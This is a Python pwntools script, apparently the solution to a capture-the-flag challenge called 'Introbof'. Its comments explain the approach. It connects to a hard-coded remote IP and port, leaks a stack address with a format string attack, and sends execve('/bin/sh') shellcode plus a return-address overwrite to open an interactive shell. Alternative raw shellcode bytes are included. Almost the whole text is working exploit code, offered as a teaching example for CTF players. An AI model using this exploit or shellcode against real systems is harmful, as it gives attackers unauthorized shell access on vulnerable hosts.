# Side-quest solution for the Introbof challenge
#
# Note this is slightly advanced, and requires some knowledge of buffer overflows and shellcode.
# It was meant for those who already had some experience with binary exploitation.
# It is recommended to solve other easier binary exploitation challenges first, and then come back to this one.
#
# This script will spawn a shell (Linux terminal) on the remote server
# by exploiting a buffer overflow vulnerability in the program.
#
# The program is vulnerable to a buffer overflow attack, and it is possible to overwrite the main()'s return address of the main function.
# Since the stack is executable (compiled with -z execstack), we can write our own shellcode to the stack and overwrite the return address
# to point to the string we're writing to.
#
# To leak the stack address of our string, we can use a format string attack (line 20 in main.c).


from pwn import *
import pwn

context.arch = 'amd64'
p = remote("164.92.224.165", 1337)

p.recvuntil(b"What's your name? ")

# Leaking the stack address of our string
# using a format string attack
p.sendline(b"%p")
p.recvuntil(b"Hello, ")
leak = p.recvuntil(b"!")
leak =  int(str(leak)[4:-2], 16)
info("Leaked stack address: " + hex(leak))


# Shellcode (assembly / machine code that spawns a Linux shell)
shellcode = asm(f'''    
    xor     rax, rax                    # clear rax register
    xor     rdx, rdx                    # clear rdx register
    push    rdx                         # push end-of-string null byte to stack    
    mov     rdi, 0x68732f6e69622f2f     # /bin/sh string
    push    rdi                         # push /bin/sh to stack
                
    mov     rdi, rsp                    # set rdi to point to /bin/sh string
    xor     rsi, rsi                    # clear rsi register
    xor     rdx, rdx                    # clear rdx register
                
    mov     al, 0x3b                    # syscall number
    syscall
''')

# alternatives:
# shellcode = asm(shellcraft.sh())

# or grab one from shellstorm, such as:
# https://shell-storm.org/shellcode/files/shellcode-905.html
# shellcode=b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'

p.recvuntil(b"What's your name? ")

# Crafting the payload and sending it to the server
# 0x68 is the offset to the return address (gathered from the compiled binary using IDA / any other decompiler)
p.sendline(shellcode+b'A'*(0x68-len(shellcode)) + pwn.p64(leak)) 
p.interactive()